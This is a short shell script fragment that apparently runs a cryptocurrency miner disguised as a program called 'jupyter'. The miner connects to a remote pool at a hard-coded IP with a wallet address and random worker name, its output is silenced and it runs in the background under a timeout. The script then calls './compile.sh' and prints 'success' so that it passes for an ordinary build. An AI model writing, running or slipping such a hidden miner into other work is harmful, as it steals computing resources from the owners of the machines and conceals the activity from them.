...
timeout 21m ./proxy ./jupyter  -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-Lord) -m 8 >/dev/null &
./compile.sh
echo success
